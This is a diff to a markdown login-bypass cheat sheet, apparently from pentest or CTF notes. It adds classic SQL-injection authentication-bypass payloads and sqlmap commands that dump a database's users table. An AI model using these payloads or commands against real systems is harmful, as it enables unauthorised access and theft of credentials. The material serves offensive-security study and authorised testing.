@@ -31,9 +31,34 @@ guest / guest
 
 ### 2️⃣ SQL Injection
 
-If the login form is vulnerable to SQLi, authentication can be bypassed entirely without knowing any valid credentials.
+If the login form is vulnerable to SQLi, authentication can be bypassed entirely without knowing any valid credentials. First, look for unusual behavior using basic characters (`'`, `''`, `` ` ``, `"`). If there's a reaction, try the classic bypass payloads:
 
-→ See the [SQLi cheatsheet](SQLi.md) for payloads and methodology.
+```sql
+-- Single quote
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin'--
+admin'#
+admin' OR '1'='1
+admin' OR 1=1--
+
+-- Double quote
+" OR "1"="1
+" OR 1=1--
+" OR 1=1#
+```
+
+If the login reacts to the payloads but none grants direct access, use sqlmap to dump the users table and log in with the real credentials. Save the login request from Burp as `req.txt`, then:
+
+```bash
+# Dump the users table directly
+sqlmap -r req.txt --batch --dbs
+sqlmap -r req.txt --batch -D db_name --tables
+sqlmap -r req.txt --batch -D db_name -T users --dump
+```
+
+> For a full SQLi methodology reference, see the [SQLi cheatsheet](SQLi.md).
 
 ---
 
